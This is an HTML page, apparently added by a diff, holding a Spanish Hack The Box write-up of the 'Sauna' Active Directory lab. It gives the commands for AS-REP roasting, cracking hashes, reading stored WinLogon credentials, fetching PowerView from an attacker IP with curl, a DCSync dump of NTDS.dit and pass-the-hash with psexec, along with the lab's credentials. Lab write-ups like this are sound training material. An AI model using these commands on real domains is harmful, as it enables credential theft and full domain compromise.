@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Sauna HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/sauna/pasted-image-20251120153600.png" alt="Sauna HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Sauna</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>AS-REP Roasting</span>
+            <span>BloodHound</span>
+            <span>DCSync</span>
+            <span>WinRM</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Lista de Usuarios desde Web. Validar con Kerbrute</li>
+            <li><code>Explotación</code>: <code>AS-REP Roasting</code></li>
+            <li><code>Movimiento lateral</code>: Credenciales Almacenadas <code>WinLogon</code></li>
+            <li><code>Escalada de Privilegios</code>: <code>DCSync</code> Attack</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/sauna/pasted-image-20251120154324.png" alt="Sauna HTB" />
+          <div class="code-card">
+            <h3>Lista de Usuarios</h3>
+            <pre><code># Crear una lista que recoja todas las entradas posibles para validarlas con Kerbrute
+username-anarchy fergus smith</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sauna/pasted-image-20260224172038.png" alt="Sauna HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Validar Usuarios + AS-REP Roasting</h2>
+          <div class="code-card">
+            <h3>Validar Usuarios y Ver si son ASREPRoasteables</h3>
+            <pre><code># Validar Usuarios y Ver Usuarios vulnerable. (El hash de kerbrute no se puede crackear)
+kerbrute userenum  --dc sauna -d EGOTISTICAL-BANK.LOCAL users -v
+# Hash ASREP-Roasting
+impacket-GetNPUsers  -no-pass -usersfile users EGOTISTICAL-BANK.LOCAL/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sauna/pasted-image-20260224172412.png" alt="Sauna HTB" />
+          <div class="code-card">
+            <h3>Crack hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlist/rockyou.txt hash
+# Credenciales
+fsmith:Thestrokes23</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Lista de usuarios del dominio</h3>
+            <pre><code>nxc smb sauna -u &#x27;fsmith&#x27; -p &#x27;Thestrokes23&#x27; --users</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>WinRM: Acceso al sistema</h3>
+            <pre><code>evil-winrm -i sauna -u &#x27;fsmith&#x27; -p &#x27;Thestrokes23&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: WinLogon</h2>
+          <div class="code-card">
+            <h3>PowerShell: Credenciales almacenadas</h3>
+            <pre><code>Get-ItemProperty -Path &#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27; | select &quot;Default*&quot;
+# Usuario svc_loanmgr
+svc_loanmanager:Moneymakestheworldgoround!</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>WinRM: Acceso al sistema</h3>
+            <pre><code>evil-winrm -i sauna -u &#x27;svc_loanmanager&#x27; -p &#x27;Moneymakestheworldgoround!&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: ataque <code>DCSync</code></h2>
+          <div class="code-card">
+            <h3>Enumerar ACL</h3>
+            <pre><code>curl http://10.10.16.130/PowerView.ps1 -o PowerView.ps1
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid svc_loanmgr
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sauna/pasted-image-20260224234038.png" alt="Sauna HTB" />
+          <div class="code-card">
+            <h3>Permisos DCSync habilitados por lo que dumpeamos NTDS.dit</h3>
+            <pre><code>nxc smb sauna -u &#x27;svc_loanmgr&#x27; -p  &#x27;Moneymakestheworldgoround!&#x27; --ntds</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sauna/pasted-image-20260224235027.png" alt="Sauna HTB" />
+          <div class="code-card">
+            <h3>Acceso como Administrator</h3>
+            <pre><code>impacket-psexec Administrator@sauna -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>TAGS</h2>
+          <p>#winlogon #DCSync #usuarios</p>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>AS-REP Roasting</span>
+            <span>BloodHound</span>
+            <span>DCSync</span>
+            <span>WinRM</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
